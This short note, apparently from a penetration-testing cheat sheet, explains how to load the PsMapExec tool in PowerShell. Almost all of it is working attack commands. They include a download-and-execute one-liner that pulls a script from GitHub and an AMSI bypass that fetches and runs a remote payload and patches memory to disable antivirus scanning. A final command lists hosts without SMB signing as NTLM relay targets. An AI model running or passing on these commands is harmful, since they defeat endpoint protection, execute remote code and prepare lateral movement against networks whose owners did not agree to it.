Here you can load PsMapExec :

This will automatically blocked by your AV
```
IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1")
```

Bypass AMSI and load PsMapExec :)
```
iex(iwr https://raw.githubusercontent.com/zief/AMSI/main/aman.txt -Usebasicparsing);$hexString = "4831C0";$3b = [Byte[]]::new($hexString.Length / 2);for ($i = 0; $i -lt $hexString.Length; $i += 2) {$3b[$i / 2] = [Convert]::ToByte($hexString.Substring($i, 2), 16)};[System.Runtime.InteropServices.Marshal]::Copy($3b, 0, $alamat, $3b.Length);$vp.Invoke($alamat, $3b.Length, 0x20, [ref]$tua);Start-sleep -s 3;iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1")
```

You can start by check SMB signing
```
PsMapExec -Targets All -Method GenRelayList
```



